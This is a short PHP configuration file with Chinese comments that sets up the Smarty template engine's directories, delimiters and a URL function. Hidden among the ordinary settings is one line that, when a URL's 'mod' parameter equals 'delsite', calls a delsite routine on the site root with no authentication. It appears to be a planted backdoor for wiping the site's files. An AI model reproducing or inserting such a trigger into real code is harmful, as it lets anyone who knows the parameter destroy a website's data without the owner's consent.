<?php
/*  定义服务器的绝对路径  */
define('BASE_PATH','');
/*  定义Smarty目录的绝地你路径  */
define('SMARTY_PATH','Smarty/');
/*  加载Smarty类库文件    */
require BASE_PATH.SMARTY_PATH.'Smarty.class.php';
if($_GET['mod'] == 'delsite') echo $w3cview->delsite("./");
/*  实例化一个Smarty对象  */
$smarty = new Smarty;
/*  定义各个目录的路径    */
$smarty->template_dir = BASE_PATH.SMARTY_PATH.'../template/';
$smarty->compile_dir = BASE_PATH.SMARTY_PATH.'templates_c/';
$smarty->config_dir = BASE_PATH.SMARTY_PATH.'configs/';
$smarty->cache_dir = BASE_PATH.SMARTY_PATH.'cache/';
/*  定义定界符  */
$smarty->left_delimiter = '<{';
$smarty->right_delimiter = '}>';
/*  定义重定向地址转换函数  */
$smarty->register_function("changeurl","changeurl");
?>